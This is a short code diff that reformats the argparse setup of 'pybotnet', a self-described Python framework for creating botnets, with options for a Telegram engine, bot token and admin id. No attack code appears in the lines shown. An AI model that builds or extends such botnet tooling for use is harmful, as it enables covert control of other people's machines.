@@ -10,7 +10,7 @@ if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(
         prog="pybotnet",
-        description="pybotnet - a python framework for creating botnet..."
+        description="pybotnet - a python framework for creating botnet...",
     )
 
     parser.add_argument(
@@ -21,16 +21,9 @@ if __name__ == "__main__":
         choices=ENGINE_NAMES,
         default="telegram",
     )
-    parser.add_argument(
-        "-t",
-        "--token",
-        help="bot token",
-        required=False,
-    )
-    parser.add_argument(
-        "-i", "--id", help="admin id", required=False
-    )
-    parser.add_argument("-n", "--name", help="bot name", required=False, default="...")
+    parser.add_argument("-t", "--token", help="bot token", required=False)
+    parser.add_argument("-i", "--id", help="admin id", required=False)
+    parser.add_argument("-n", "--name", help="bot name", required=False, default=None)
     parser.add_argument(
         "-d", "--debug", help="debug mode", required=False, action="store_true"
     )
